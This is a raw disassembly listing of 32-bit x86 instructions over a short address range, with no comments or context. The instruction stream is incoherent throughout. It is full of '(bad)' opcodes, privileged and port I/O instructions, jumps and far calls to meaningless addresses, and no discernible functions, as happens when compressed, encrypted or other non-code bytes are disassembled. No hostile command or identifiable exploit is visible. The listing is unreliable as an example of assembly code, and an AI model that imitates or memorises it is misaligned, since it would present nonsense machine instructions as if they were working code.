  4a14cd:	fbld   TBYTE PTR ds:0xccefac1f
  4a14d3:	add    eax,0x18957ae
  4a14d8:	pop    ebx
  4a14d9:	pop    edi
  4a14da:	sub    DWORD PTR [eax-0x2b],ebx
  4a14dd:	sub    BYTE PTR [ebx-0x6d],bh
  4a14e0:	hlt    
  4a14e1:	add    eax,0x24748111
  4a14e6:	imul   eax,ebp,0xe884969e
  4a14ec:	add    ch,ah
  4a14ee:	mov    al,ds:0x392954ce
  4a14f3:	mov    cl,0x49
  4a14f5:	or     BYTE PTR [ebp+0x32],bh
  4a14f8:	adc    BYTE PTR [edx+0x36746e7c],bh
  4a14fe:	fisub  WORD PTR ds:0x8fd61f45
  4a1504:	xchg   al,dh
  4a1506:	cdq    
  4a1507:	imul   edx,DWORD PTR [edx],0xffffffcb
  4a150a:	(bad)  
  4a150b:	dec    eax
  4a150c:	imul   dx,WORD PTR [edi-0x71],0x4
  4a1511:	cwde   
  4a1512:	jmp    0xac928047
  4a1517:	fcomp  DWORD PTR [esi+0x7f80958]
  4a151d:	pop    es
  4a151e:	movzx  eax,BYTE PTR [edx+0xb]
  4a1522:	neg    eax
  4a1524:	push   ecx
  4a1525:	sbb    eax,eax
  4a1527:	add    BYTE PTR [esi],ch
  4a1529:	push   ebx
  4a152a:	scas   al,BYTE PTR es:[edi]
  4a152b:	cld    
  4a152c:	xchg   ebp,eax
  4a152d:	das    
  4a152e:	ds movs BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4a1531:	jecxz  0x4a1562
  4a1533:	das    
  4a1534:	pop    eax
  4a1535:	and    al,0xbc
  4a1537:	in     al,0x28
  4a1539:	sahf   
  4a153a:	mov    eax,ds:0x58d8cf21
  4a153f:	pushf  
  4a1540:	xor    DWORD PTR [eax+eiz*8+0x145a1b8f],esp
  4a1547:	jg     0x4a1586
  4a1549:	rcl    BYTE PTR [edi+0x68],1
  4a154c:	sub    edi,DWORD PTR [ebp+0x3f3482b0]
  4a1552:	mov    esp,0x58ea7e14
  4a1557:	inc    ebp
  4a1558:	mov    esi,0x493d2916
  4a155d:	call   FWORD PTR [ecx+0x50]
  4a1560:	dec    ebp
  4a1561:	(bad)  
  4a1562:	xor    DWORD PTR [ebp+ecx*2-0x6f20ef51],ebp
  4a1569:	test   al,0xc2
  4a156b:	stos   DWORD PTR es:[edi],eax
  4a156c:	aaa    
  4a156d:	push   ss
  4a156e:	add    dl,BYTE PTR [esp+edi*1+0x4a]
  4a1572:	mov    ebp,0xb0319d90
  4a1577:	int    0xbe
  4a1579:	adc    dh,al
  4a157b:	sub    eax,0x6806106d
  4a1580:	leave  
  4a1581:	xchg   DWORD PTR ds:0x5024f3c6,eax
  4a1587:	fsub   DWORD PTR [eax]
  4a1589:	jl     0x4a15cd
  4a158b:	out    0xc4,eax
  4a158d:	mov    ebp,0x2d702535
  4a1592:	push   edx
  4a1593:	and    al,0xdf
  4a1595:	adc    ecx,DWORD PTR [eax+ecx*4+0x85d486e]
  4a159c:	and    esi,DWORD PTR [eax+eiz*4-0x178bd14a]
  4a15a3:	or     al,0xb9
  4a15a5:	or     BYTE PTR [eax+0x53],ch
  4a15a8:	cwde   
  4a15a9:	cli    
  4a15aa:	mov    esp,0x7b4b14ff
  4a15af:	loope  0x4a154e
  4a15b1:	jbe    0x4a1612
  4a15b3:	inc    edx
  4a15b4:	adc    BYTE PTR es:[ecx+0x7c],bl
  4a15b8:	mov    ch,0xe1
  4a15ba:	pop    ebp
  4a15bb:	inc    DWORD PTR [ebx-0x76bf7537]
  4a15c1:	add    al,BYTE PTR [ebx-0x3af93aa3]
  4a15c7:	adc    DWORD PTR [edx+0x39240047],edi
  4a15cd:	pusha  
  4a15ce:	inc    ebp
  4a15cf:	lock mov eax,0xce4ba40b
  4a15d5:	dec    ebx
  4a15d6:	stos   DWORD PTR es:[edi],eax
  4a15d7:	inc    esi
  4a15d8:	pop    ebp
  4a15d9:	pop    ss
  4a15da:	xchg   al,al
  4a15dc:	xchg   BYTE PTR [edi+ecx*2],dl
  4a15df:	inc    edi
  4a15e0:	add    eax,0x7c222744
  4a15e5:	pop    esi
  4a15e6:	rol    esi,0x48
  4a15e9:	in     al,dx
  4a15ea:	outs   dx,DWORD PTR ds:[esi]
  4a15eb:	xor    edx,DWORD PTR [ecx-0x15]
  4a15ee:	in     al,0xb7
  4a15f0:	fimul  WORD PTR [ecx+eax*1]
  4a15f3:	xchg   ah,bh
  4a15f5:	mov    edi,0x5d6e130b
  4a15fa:	test   bl,0xbc
  4a15fd:	sub    eax,0x1c40c574
  4a1602:	(bad)  [ebp+0x45]
  4a1605:	jmp    0x4a162f
  4a1607:	inc    edi
  4a1608:	inc    ebp
  4a1609:	sbb    BYTE PTR [ebp-0x5bb0e767],al
  4a160f:	jne    0x4a1671
  4a1611:	int3   
  4a1612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a1613:	xchg   esp,eax
  4a1614:	xor    DWORD PTR [ebx+eiz*4+0x277cd116],ecx
  4a161b:	test   ch,ah
  4a161d:	cmp    esi,0x23
  4a1620:	cld    
  4a1621:	hlt    
  4a1622:	test   al,0xad
  4a1624:	mov    WORD PTR [ebx+edx*2+0x4922c030],fs
  4a162b:	add    DWORD PTR [esi+0x4e],edx
  4a162e:	or     esi,eax
  4a1630:	jbe    0x4a1631
  4a1632:	or     BYTE PTR [esi+0x16],0xb3
  4a1636:	adc    al,0x1
  4a1638:	add    cl,BYTE PTR ds:0xb7de0318
  4a163e:	icebp  
  4a163f:	jge    0x4a15fc
  4a1641:	add    cl,BYTE PTR [eax]
  4a1643:	mov    edi,ecx
  4a1645:	mov    BYTE PTR [eax],dl
  4a1647:	xor    al,BYTE PTR [edx*4+0x25e95f67]
  4a164e:	add    eax,0x3b15ebf8
  4a1653:	shl    esi,0x26
  4a1656:	pop    es
  4a1657:	or     bh,ah
  4a1659:	pop    ecx
  4a165a:	inc    eax
  4a165b:	cmp    ah,BYTE PTR [ecx+0x6e]
  4a165e:	push   es
  4a165f:	mov    eax,DWORD PTR [ebp+0x2c898aa6]
  4a1665:	cmp    eax,edi
  4a1667:	jge    0x4a1671
  4a1669:	mov    al,cl
  4a166b:	mov    al,0xc2
  4a166d:	adc    DWORD PTR [esi],edx
  4a166f:	or     dh,BYTE PTR [eax+edx*4]
  4a1672:	jl     0x4a1650
  4a1674:	push   ds
  4a1675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a1676:	or     DWORD PTR [ecx+0x8],ebx
  4a1679:	jb     0x4a16d1
  4a167b:	jle    0x4a1608
  4a167d:	add    dl,BYTE PTR [edi+0x25]
  4a1680:	hlt    
  4a1681:	adc    DWORD PTR [eax],eax
  4a1683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a1684:	sbb    bl,ch
  4a1686:	add    edi,DWORD PTR [eax-0x50]
  4a1689:	cmp    DWORD PTR [eax-0x3e],0xa1f9d50
  4a1690:	push   ss
  4a1691:	sti    
  4a1692:	jne    0x4a164b
  4a1694:	xor    BYTE PTR [ebx+0x52],dl
  4a1697:	das    
  4a1698:	push   eax
  4a1699:	inc    eax
  4a169a:	jbe    0x4a16d7
  4a169c:	mov    esi,0xad7e4590
  4a16a1:	icebp  
  4a16a2:	mov    ebp,0x4a100c6a
  4a16a7:	xchg   esp,eax
  4a16a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a16a9:	mov    bl,0x49
  4a16ab:	addr16 call 0x1d568ea4
  4a16b1:	pop    eax
  4a16b2:	inc    esi
  4a16b3:	js     0x4a16ce
  4a16b5:	fist   DWORD PTR [edi+0x6a51a4f9]
  4a16bb:	lock call ebx
  4a16be:	es in  eax,0x38
  4a16c1:	bound  ecx,QWORD PTR [eax]
  4a16c3:	std    
  4a16c4:	cs lock mov dh,0x56
  4a16c8:	sbb    ch,ah
  4a16ca:	rcr    DWORD PTR [ebx-0x73],cl
  4a16cd:	dec    esp
  4a16ce:	js     0x4a16d8
  4a16d0:	dec    edi
  4a16d1:	and    BYTE PTR [ebx+0x0],bh
  4a16d4:	sbb    ah,BYTE PTR [esi]
  4a16d6:	cs pop ecx
  4a16d8:	mov    BYTE PTR [ebp+ebx*1-0x40],dh
  4a16dc:	fs stc 
  4a16de:	pop    edi
  4a16df:	push   ecx
  4a16e0:	sub    al,0x26
  4a16e2:	push   ss
  4a16e3:	cmp    edx,DWORD PTR [eax-0x7]
  4a16e6:	retf   
  4a16e7:	adc    esp,DWORD PTR [ebp+0x50d20fa9]
  4a16ed:	fistp  WORD PTR [ebp+0x3]
  4a16f0:	and    DWORD PTR [edi],eax
  4a16f2:	add    eax,0x94030333
  4a16f7:	xchg   ebx,eax
  4a16f8:	pop    eax
  4a16f9:	and    al,0xe1
  4a16fb:	push   0xffffff8c
  4a16fd:	dec    edi
  4a16fe:	dec    ebx
  4a16ff:	in     al,dx
  4a1700:	cmc    
  4a1701:	into   
  4a1702:	sub    eax,0xa47280d4
  4a1707:	gs daa 
  4a1709:	push   es
  4a170a:	adc    ecx,DWORD PTR [esi+0x43]
  4a170d:	mov    ds:0xa2683d38,al
  4a1712:	jo     0x4a175e
  4a1714:	daa    
  4a1715:	shl    BYTE PTR ds:0xa5cd5608,1
  4a171b:	xor    DWORD PTR [ecx-0x2a],edx
  4a171e:	jge    0x4a16e9
  4a1720:	fwait
  4a1721:	sub    edx,DWORD PTR ds:0x26e70b52
  4a1727:	push   ds
  4a1728:	add    ebp,DWORD PTR [edx-0x35]
  4a172b:	xlat   BYTE PTR ds:[ebx]
  4a172c:	push   eax
  4a172d:	jmp    0x4a1746
  4a172f:	mov    esi,0x1d745fef
  4a1734:	add    al,0x87
  4a1736:	shl    DWORD PTR [edi],cl
  4a1738:	lea    ecx,[ebx]
  4a173a:	mov    eax,0x3b6613e5
  4a173f:	adc    BYTE PTR [esi],ch
  4a1741:	adc    al,0x6e
  4a1743:	xlat   BYTE PTR ds:[ebx]
  4a1744:	adc    BYTE PTR ds:0x436c7e56,ch
  4a174a:	push   cs
  4a174b:	(bad)  
  4a174c:	test   al,0xe5
  4a174e:	adc    ebx,DWORD PTR [esi-0x43f004fc]
  4a1754:	dec    esp
  4a1755:	sub    eax,0x74be88
  4a175a:	push   eax
  4a175b:	aam    0x0
  4a175d:	inc    ebx
  4a175e:	mov    eax,0x10d0f698
  4a1763:	fwait
  4a1764:	adc    BYTE PTR [eax-0x2f],dl
  4a1767:	call   0x209a5148
  4a176c:	(bad)  
  4a176d:	scas   al,BYTE PTR es:[edi]
  4a176e:	arpl   WORD PTR [esi-0x692eebcd],si
  4a1774:	sahf   
  4a1775:	(bad)  
  4a1776:	daa    
  4a1777:	lods   al,BYTE PTR ds:[esi]
  4a1778:	cli    
  4a1779:	cld    
  4a177a:	ror    DWORD PTR [esi+ecx*1],0x69
  4a177e:	jecxz  0x4a17b3
  4a1780:	fist   DWORD PTR [edx+0xd]
  4a1783:	popa   
  4a1784:	adc    DWORD PTR ds:[edx-0x60],ebp
  4a1788:	mov    esp,0x78b6ef8
  4a178d:	gs jecxz 0x4a17ff
  4a1790:	add    dl,ah
  4a1792:	cmp    eax,ebx
  4a1794:	jbe    0x4a1807
  4a1796:	lea    ecx,[edi+0x8]
  4a1799:	push   ecx
  4a179a:	outs   dx,DWORD PTR ds:[esi]
  4a179b:	(bad)  
  4a179c:	mov    edx,0xe281b631
  4a17a1:	adc    al,al
  4a17a3:	loope  0x4a17c9
  4a17a5:	ss sub edx,ebx
  4a17a8:	dec    esi
  4a17a9:	sbb    al,0x46
  4a17ab:	push   esi
  4a17ac:	cmc    
  4a17ad:	sbb    BYTE PTR [esi],ch
  4a17af:	adc    al,0x2e
  4a17b1:	call   0x8a536f14
  4a17b6:	ret    
  4a17b7:	sub    DWORD PTR [eax+0x24],ebp
  4a17ba:	ret    0xcca9
  4a17bd:	push   eax
  4a17be:	add    BYTE PTR [eax+0x62],cl
  4a17c1:	test   al,0x30
  4a17c3:	shr    BYTE PTR [ebp+0x19],0x16
  4a17c7:	or     DWORD PTR [ecx-0x73cdb0c0],ebx
  4a17cd:	xor    al,al
  4a17cf:	or     al,0xd2
  4a17d1:	push   edx
  4a17d2:	xchg   edx,eax
  4a17d3:	dec    esp
  4a17d4:	out    dx,al
  4a17d5:	xchg   ebx,eax
  4a17d6:	nop
  4a17d7:	fld    TBYTE PTR [esi]
  4a17d9:	sub    BYTE PTR [ebp-0x7b],dh
  4a17dc:	or     BYTE PTR [ecx],dl
  4a17de:	and    ebp,DWORD PTR [edi+0x56761861]
  4a17e4:	js     0x4a182a
  4a17e6:	or     ch,ch
  4a17e8:	push   cs
  4a17e9:	pop    ebp
  4a17ea:	mov    WORD PTR [ebx],ss
  4a17ec:	adc    DWORD PTR [ebx+0x598d6d50],edi
  4a17f2:	dec    edi
  4a17f3:	or     al,0x16
  4a17f5:	jae    0x4a1837
  4a17f7:	imul   ecx,DWORD PTR [ecx],0x12
  4a17fa:	mov    eax,0x6793d2d8
  4a17ff:	or     DWORD PTR [edi+0x40],ebp
  4a1802:	stc    
  4a1803:	cwde   
  4a1804:	pop    ebp
  4a1805:	adc    al,0xc4
  4a1807:	or     al,0xd6
  4a1809:	leave  
  4a180a:	je     0x4a1858
  4a180c:	sub    BYTE PTR [eax+0x1f],0x30
  4a1810:	retf   
  4a1811:	xor    DWORD PTR [ecx+0x10320cb6],edx
  4a1817:	sbb    eax,0xc8316c5f
  4a181c:	rcl    cl,0x10
  4a181f:	adc    BYTE PTR [ecx+0x51],bh
  4a1822:	mov    cl,BYTE PTR [ecx]
  4a1824:	add    DWORD PTR [ebx],ebx
  4a1826:	ror    BYTE PTR [ecx],0x1c
  4a1829:	push   edi
  4a182a:	inc    esp
  4a182b:	inc    eax
  4a182c:	add    eax,0xd46480e0
  4a1831:	or     eax,0x8dd6af02
  4a1836:	jns    0x4a18a2
  4a1838:	test   al,0x92
  4a183a:	shl    BYTE PTR [esi+0x27],0xbe
  4a183e:	mov    edi,0x43db3202
  4a1843:	lods   eax,DWORD PTR ds:[esi]
  4a1844:	test   al,0xa2
  4a1846:	dec    esp
  4a1847:	cmp    DWORD PTR [esi+0x1c],edx
  4a184a:	ins    BYTE PTR es:[edi],dx
  4a184b:	or     al,BYTE PTR [eax+0x1c]
  4a184e:	inc    ebx
  4a184f:	push   0x28
  4a1851:	adc    ch,dh
  4a1853:	clc    
  4a1854:	test   eax,0x8d34ba39
  4a185a:	push   ebp
  4a185b:	adc    al,0x32
  4a185d:	and    al,0x36
  4a185f:	push   eax
  4a1860:	xor    DWORD PTR [esp+edi*1],eax
  4a1863:	adc    esp,DWORD PTR [ebp+0x209d4849]
  4a1869:	lods   al,BYTE PTR ds:[esi]
  4a186a:	xor    eax,0xf024cc44
  4a186f:	js     0x4a18d1
  4a1871:	test   al,0xf4
  4a1873:	push   ecx
  4a1874:	mov    cl,0x18
  4a1876:	ret    
  4a1877:	xchg   BYTE PTR [ecx-0x2c],cl
  4a187a:	call   0x46e0:0x3472ca94
  4a1881:	scas   al,BYTE PTR es:[edi]
  4a1882:	and    al,0xaa
  4a1884:	push   edi
  4a1885:	push   eax
  4a1886:	add    esp,DWORD PTR [ebx]
  4a1888:	mov    dl,0xb
  4a188a:	idiv   BYTE PTR [eax+eiz*1]
  4a188d:	adc    DWORD PTR [eax-0x3773e17c],esi
  4a1893:	sub    BYTE PTR [ebx-0x516f595c],ah
  4a1899:	(bad)  
  4a189b:	dec    ecx
  4a189c:	push   ebx
  4a189d:	dec    ebp
  4a189e:	push   ds
  4a189f:	push   0x65
  4a18a1:	scas   eax,DWORD PTR es:[edi]
  4a18a2:	loop   0x4a182b
  4a18a4:	dec    esi
  4a18a5:	or     BYTE PTR [ebp-0x20],cl
  4a18a8:	pop    eax
  4a18a9:	pop    ecx
  4a18aa:	int3   
  4a18ab:	outs   dx,BYTE PTR ds:[esi]
  4a18ac:	push   esp
  4a18ad:	or     al,dh
  4a18af:	dec    eax
  4a18b0:	cld    
  4a18b1:	cmp    dl,BYTE PTR [edx-0x3b]
  4a18b4:	sub    BYTE PTR [ebx-0x4b4be88b],dl
  4a18ba:	loopne 0x4a1926
  4a18bc:	clc    
  4a18bd:	(bad)  
  4a18be:	(bad)  
  4a18bf:	pop    edi
  4a18c0:	outs   dx,DWORD PTR ds:[esi]
  4a18c1:	jecxz  0x4a1856
  4a18c3:	xor    BYTE PTR ds:0x795451ab,dl
  4a18c9:	cmp    ebx,eax
  4a18cb:	clc    
  4a18cc:	out    dx,al
  4a18cd:	jns    0x4a1890
  4a18cf:	test   BYTE PTR [eax],dh
  4a18d1:	cdq    
  4a18d2:	xor    eax,0x358097e3
  4a18d7:	js     0x4a1881
  4a18d9:	push   0x61273ab0
  4a18de:	es inc esi
  4a18e0:	mov    esi,0x97d69d4
  4a18e5:	std    
  4a18e6:	push   ss
  4a18e7:	jo     0x4a1933
  4a18e9:	push   0x19d6ccec
  4a18ee:	in     eax,dx
  4a18ef:	lods   al,BYTE PTR ds:[esi]
  4a18f0:	retf   0x19e0
  4a18f3:	push   0xffffffec
  4a18f5:	in     al,dx
  4a18f6:	mov    esp,DWORD PTR [edi]
  4a18f8:	pop    ebx
  4a18f9:	int    0x8b
  4a18fb:	dec    esi
  4a18fc:	cmp    DWORD PTR [edi],esi
  4a18fe:	jbe    0x4a1943
  4a1900:	add    al,0xea
  4a1902:	and    dh,BYTE PTR [edx+0x5b]
  4a1905:	rcr    BYTE PTR [ebp-0x20],0x47
  4a1909:	jne    0x4a195a
  4a190b:	jmp    0x53d76691
  4a1910:	clc    
  4a1911:	push   edx
  4a1912:	add    bh,BYTE PTR [esi+0x13a3a148]
  4a1918:	jne    0x4a191c
  4a191a:	or     al,0x11
  4a191c:	not    al
  4a191e:	and    al,0xc
  4a1920:	sub    DWORD PTR [esi+0x27],edx
  4a1923:	mov    eax,edi
  4a1925:	int    0xca
  4a1927:	dec    eax
  4a1928:	or     al,0x46
  4a192a:	cmp    esi,DWORD PTR [edi]
  4a192c:	jb     0x4a18f1
  4a192e:	mov    ebp,0x6203800a
  4a1933:	dec    ebp
  4a1934:	loopne 0x4a191a
  4a1936:	or     ecx,edx
  4a1938:	or     al,0x9c
  4a193a:	or     DWORD PTR [esi],edi
  4a193c:	mov    al,ds:0x7ebf2c2
  4a1941:	lods   al,BYTE PTR ds:[esi]
  4a1942:	xchg   esi,eax
  4a1943:	int3   
  4a1944:	sub    DWORD PTR [edx-0x68],esi
  4a1947:	xor    al,0x28
  4a1949:	cld    
  4a194a:	mov    ebx,0xa41b0349
  4a194f:	or     eax,0x6ba4d3b
  4a1954:	cmp    al,0x12
  4a1956:	mov    cl,0xed
  4a1958:	(bad)  
  4a1959:	sbb    ebx,ebx
  4a195b:	mov    bh,BYTE PTR [eax]
  4a195d:	and    esp,esp
  4a195f:	xor    esp,DWORD PTR ds:0x62e20fb3
  4a1965:	or     BYTE PTR [esi+0x184827c3],ch
  4a196b:	cmc    
  4a196c:	add    BYTE PTR [esi+ecx*2+0x52ad80a5],0x40
  4a1974:	cdq    
  4a1975:	push   ss
  4a1976:	repz gs pop esp
  4a1979:	pop    eax
  4a197a:	hlt    
  4a197b:	dec    eax
  4a197c:	js     0x4a19d6
  4a197e:	add    edx,DWORD PTR [ecx]
  4a1980:	mov    ebx,0xed92f0c
  4a1985:	arpl   WORD PTR [ecx],dx
  4a1987:	jno    0x4a1991
  4a1989:	(bad)  
  4a198a:	int3   
  4a198b:	cmp    eax,0xa7498c00
  4a1990:	add    BYTE PTR [ebx+0x57469ff0],0x69
  4a1997:	test   al,0x71
  4a1999:	or     BYTE PTR [ebx+0x11],ah
  4a199c:	dec    ecx
  4a199d:	push   cs
  4a199e:	cmp    eax,0x3d52455b
  4a19a3:	out    dx,al
  4a19a4:	add    BYTE PTR [esi],dh
  4a19a6:	jne    0x4a1a0d
  4a19a8:	pushf  
  4a19a9:	lods   eax,DWORD PTR ds:[esi]
  4a19aa:	or     eax,0xed057cea
  4a19af:	out    0xdc,al
  4a19b1:	mov    ch,0x24
  4a19b3:	mov    ds:0x281d771b,eax
  4a19b8:	daa    
  4a19b9:	adc    ch,dh
  4a19bb:	add    ah,BYTE PTR [ecx-0x7b]
  4a19be:	mov    eax,DWORD PTR [ebx]
  4a19c0:	mov    BYTE PTR [esi+0x257371b],bh
  4a19c6:	(bad)  
  4a19c7:	inc    ecx
  4a19c8:	pop    edx
  4a19c9:	cmp    eax,0x50435245
  4a19ce:	push   edx
  4a19cf:	jbe    0x4a1951
  4a19d1:	pushf  
  4a19d2:	sub    BYTE PTR [ebx-0x5d],bh
  4a19d5:	mov    ecx,0x8736d20a
  4a19da:	xor    BYTE PTR [esi-0xd],bh
  4a19dd:	dec    ebx
  4a19de:	add    al,0x4e
  4a19e0:	push   ecx
  4a19e1:	dec    ebx
  4a19e2:	sti    
  4a19e3:	(bad)  
  4a19e4:	aad    0x72
  4a19e6:	dec    eax
  4a19e7:	push   ebx
  4a19e8:	or     BYTE PTR [eax],ah
  4a19ea:	push   edx
  4a19eb:	fwait
  4a19ec:	xor    eax,0x43d80694
  4a19f1:	add    cl,BYTE PTR [edi+0x419b1e66]
  4a19f7:	call   0x1051:0x104b0c4d
  4a19fe:	push   ebx
  4a19ff:	adc    ch,BYTE PTR [esi]
  4a1a01:	jns    0x4a1986
  4a1a03:	xor    al,0x52
  4a1a05:	adc    bl,BYTE PTR [esi+0x14]
  4a1a08:	adc    al,0x2e
  4a1a0a:	jns    0x4a1a3a
  4a1a0c:	jns    0x4a1a24
  4a1a0e:	push   ss
  4a1a0f:	sbb    BYTE PTR [eax],bl
  4a1a11:	repnz pop esp
  4a1a13:	sub    edi,DWORD PTR [eax+0x1a]
  4a1a16:	ds inc eax
  4a1a18:	sbb    bl,BYTE PTR gs:[eax+ecx*4]
  4a1a1c:	ja     0x4a1a43
  4a1a1e:	or     BYTE PTR [esi+0x1c2a105a],cl
  4a1a24:	pusha  
  4a1a25:	nop
  4a1a26:	or     ecx,DWORD PTR [edx+0x146e3dd2]
  4a1a2c:	mov    ecx,0xc216130b
  4a1a31:	pop    eax
  4a1a32:	test   DWORD PTR [ebx-0xa],ecx
  4a1a35:	mov    es,WORD PTR [ebx+0x4]
  4a1a38:	xchg   ebx,eax
  4a1a39:	mov    dh,0x41
  4a1a3b:	or     ch,bl
  4a1a3d:	xchg   DWORD PTR [ebx+0x28],ecx
  4a1a40:	sbb    dl,BYTE PTR [ecx+0x50]
  4a1a43:	adc    BYTE PTR [ecx-0x7d],al
  4a1a46:	sub    BYTE PTR [esi+0x24c2e444],ch
  4a1a4c:	push   esi
  4a1a4d:	jg     0x4a1a51
  4a1a4f:	and    al,0x24
  4a1a51:	rol    BYTE PTR [ebp+0x60],1
  4a1a54:	jge    0x4a1a5e
  4a1a56:	inc    esp
  4a1a57:	and    al,0xac
  4a1a59:	xchg   esp,eax
  4a1a5a:	outs   dx,BYTE PTR ds:[esi]
  4a1a5c:	pop    es
  4a1a5d:	cmp    eax,DWORD PTR [edi+0x36]
  4a1a60:	xchg   DWORD PTR [edx+0x34],ebx
  4a1a63:	fstp   TBYTE PTR [edi]
  4a1a65:	loopne 0x4a1a64
  4a1a67:	stos   BYTE PTR es:[edi],al
  4a1a68:	dec    ebp
  4a1a69:	sub    al,0x40
  4a1a6b:	mov    DWORD PTR [eax],ebp
  4a1a6d:	dec    edi
  4a1a6e:	or     BYTE PTR [eax-0x3bbabf0],al
  4a1a74:	test   BYTE PTR [ebp+0x28],0x54
  4a1a78:	and    BYTE PTR [eax],cl
  4a1a7a:	js     0x4a1a1e
  4a1a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a1a7d:	dec    edx
  4a1a7e:	dec    esi
  4a1a7f:	and    al,0x80
  4a1a81:	shl    BYTE PTR [esi+0x57],0xe
  4a1a85:	mov    DWORD PTR [ebp-0x40],esi
  4a1a88:	outs   dx,BYTE PTR ds:[esi]
  4a1a89:	or     cl,BYTE PTR [ebp+0x24]
  4a1a8c:	pop    ss
  4a1a8d:	add    dh,ah
  4a1a8f:	xor    BYTE PTR [eax+0x2a],dh
  4a1a92:	aaa    
  4a1a93:	mov    edi,0x5c4dfc01
  4a1a98:	cmp    ecx,0x76
  4a1a9b:	ja     0x921492d9
  4a1aa1:	ds adc bl,dh
  4a1aa4:	sbb    eax,0xeddec84
  4a1aa9:	jmp    0x4a1aee
  4a1aab:	sbb    al,BYTE PTR [ebx-0x78]
  4a1aae:	mov    BYTE PTR [edi],ch
  4a1ab0:	xchg   ebp,eax
  4a1ab1:	cmp    BYTE PTR [ebx-0x80],cl
  4a1ab4:	jnp    0x4a1ab9
  4a1ab6:	mov    ds:0x4d070962,al
  4a1abb:	loopne 0x4a1acb
  4a1abd:	pop    esi
  4a1abe:	js     0x4a1b08
  4a1ac0:	mov    ds:0xaa8520c2,al
  4a1ac5:	mov    edx,0x8181b803
  4a1aca:	and    esi,DWORD PTR [esi]
  4a1acc:	pusha  
  4a1acd:	pusha  
  4a1ace:	test   eax,esp
  4a1ad0:	push   ss
  4a1ad1:	fcom   DWORD PTR [ebp+0x28401a60]
  4a1ad7:	test   DWORD PTR [ebx+edx*4-0x5c],esp
  4a1adb:	push   edi
  4a1adc:	jno    0xf43a3f4a
  4a1ae2:	rcr    edx,cl
  4a1ae4:	cmp    edx,DWORD PTR [edi]
  4a1ae6:	push   edi
  4a1ae7:	ins    BYTE PTR es:[edi],dx
  4a1ae8:	sub    edx,DWORD PTR [edi+0x1c]
  4a1aeb:	into   
  4a1aec:	inc    esp
  4a1aed:	ins    BYTE PTR es:[edi],dx
  4a1aee:	sub    eax,DWORD PTR [edi+0x68]
  4a1af1:	mov    esp,0x705d3677
  4a1af6:	adc    DWORD PTR [edi-0x73],ecx
  4a1af9:	je     0x4a1b77
  4a1afb:	add    eax,0x92fd06e6
  4a1b00:	pushf  
  4a1b01:	and    eax,0x8455a2f9
  4a1b06:	fidivr WORD PTR [eax-0x4c]
  4a1b09:	out    dx,al
  4a1b0a:	cld    
  4a1b0b:	pop    es
  4a1b0c:	sub    al,0xe5
  4a1b0e:	cmp    DWORD PTR [ebx],0x5c056bab
  4a1b14:	mov    BYTE PTR [eax+edi*2-0x65],ch
  4a1b18:	xchg   DWORD PTR [eax],esp
  4a1b1a:	push   ss
  4a1b1b:	jp     0x4a1a9e
  4a1b1d:	into   
  4a1b1e:	dec    edx
  4a1b1f:	jl     0x4a1ab0
  4a1b21:	cwde   
  4a1b22:	or     DWORD PTR [ebp-0x80],0xffffffbf
  4a1b26:	adc    ah,BYTE PTR [ecx+0x20]
  4a1b29:	jle    0x4a1b6a
  4a1b2b:	lds    ecx,FWORD PTR [edi-0x10eea047]
  4a1b31:	rol    DWORD PTR [edi],0x32
  4a1b34:	mov    BYTE PTR [esi+0x77],bl
  4a1b37:	ins    BYTE PTR es:[edi],dx
  4a1b38:	ret    
  4a1b39:	push   es
  4a1b3a:	mov    al,ds:0x89810d03
  4a1b3f:	push   edx
  4a1b40:	fisub  WORD PTR [esi+0x78]
  4a1b43:	fist   DWORD PTR [edi+0x1098ada6]
  4a1b49:	addr16 jmp 0x4a1bb0
  4a1b4c:	je     0x4a1bb9
  4a1b4e:	or     BYTE PTR [ebp+0x74],ah
  4a1b51:	je     0x4a1b63
  4a1b53:	sub    BYTE PTR [edx-0x8c9979a],bl
  4a1b59:	add    eax,DWORD PTR ds:0xda962e19
  4a1b5f:	add    esp,DWORD PTR [ebp-0x66]
  4a1b62:	xchg   esi,eax
  4a1b63:	sbb    DWORD PTR [ebx],eax
  4a1b65:	push   es
  4a1b66:	fdiv   DWORD PTR [esi+0x1fcf4220]
  4a1b6c:	or     al,0x40
  4a1b6e:	lods   al,BYTE PTR ds:[esi]
  4a1b6f:	mov    bl,0x18
  4a1b71:	adc    al,0x57
  4a1b73:	js     0x4a1bd5
  4a1b75:	inc    edx
  4a1b76:	or     al,0x6d
  4a1b78:	push   edi
  4a1b79:	bound  ebx,QWORD PTR [esi+0x64]
  4a1b7c:	pop    es
  4a1b7d:	outs   dx,DWORD PTR ds:[esi]
  4a1b7e:	ins    BYTE PTR es:[edi],dx
  4a1b7f:	ins    DWORD PTR es:[edi],dx
  4a1b80:	push   edi
  4a1b81:	xchg   esp,eax
  4a1b82:	push   esi
  4a1b83:	not    DWORD PTR [edi*1-0x7a5503e2]
  4a1b8a:	aas    
  4a1b8b:	in     eax,dx
  4a1b8c:	rol    al,1
  4a1b8e:	jecxz  0x4a1c06
  4a1b90:	call   0x4242c05
  4a1b95:	pop    ebp
  4a1b96:	sbb    al,0xaa
  4a1b98:	popf   
  4a1b99:	sar    DWORD PTR [ebx-0x67],0xc0
  4a1b9d:	add    al,0xe1
  4a1b9f:	rol    edx,0x3
  4a1ba2:	sbb    al,ah
  4a1ba4:	and    ecx,DWORD PTR [ebp+0xd7ddc05]
  4a1baa:	inc    edx
  4a1bab:	cmp    al,0x82
  4a1bad:	ss clc 
  4a1baf:	sub    al,0xb1
  4a1bb1:	pop    eax
  4a1bb2:	lea    esi,[ebp+0x5864a6d9]
  4a1bb8:	and    al,0x70
  4a1bba:	mov    eax,DWORD PTR [edi]
  4a1bbc:	je     0x28993fe2
  4a1bc2:	cli    
  4a1bc3:	inc    ebp
  4a1bc4:	fsubr  QWORD PTR [esi+0xd]
  4a1bc7:	loope  0x4a1c08
  4a1bc9:	add    esp,eax
  4a1bcb:	sbb    al,0x39
  4a1bcd:	inc    edi
  4a1bce:	and    BYTE PTR [esi+0x2b],bh
  4a1bd1:	(bad)  
  4a1bd3:	es (bad) 
  4a1bd5:	jg     0x4a1c4b
  4a1bd7:	add    DWORD PTR [ecx-0x64ef236c],ebx
